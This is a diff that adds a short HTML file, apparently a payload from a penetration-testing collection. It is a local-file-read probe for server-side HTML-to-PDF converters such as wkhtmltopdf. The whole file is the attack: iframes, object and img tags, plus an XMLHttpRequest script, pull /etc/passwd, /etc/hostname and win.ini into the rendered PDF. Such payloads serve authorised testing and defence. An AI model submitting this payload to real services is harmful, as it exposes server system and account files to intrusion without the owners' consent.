@@ -1,0 +1,13 @@
+<!-- Server-side HTML->PDF local file read (wkhtmltopdf --enable-local-file-access,
+     older headless engines). Rendered PDF embeds the file contents. -->
+<!DOCTYPE html><html><body>
+<h1>html-to-pdf LFI probe</h1>
+<iframe src="file:///etc/passwd" width="800" height="400"></iframe>
+<iframe src="file:///C:/Windows/win.ini" width="800" height="200"></iframe>
+<object data="file:///etc/hostname"></object>
+<img src="file:///etc/passwd">
+<script>
+try{var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();
+document.write('<pre>'+x.responseText+'</pre>');}catch(e){document.write(e)}
+</script>
+</body></html>
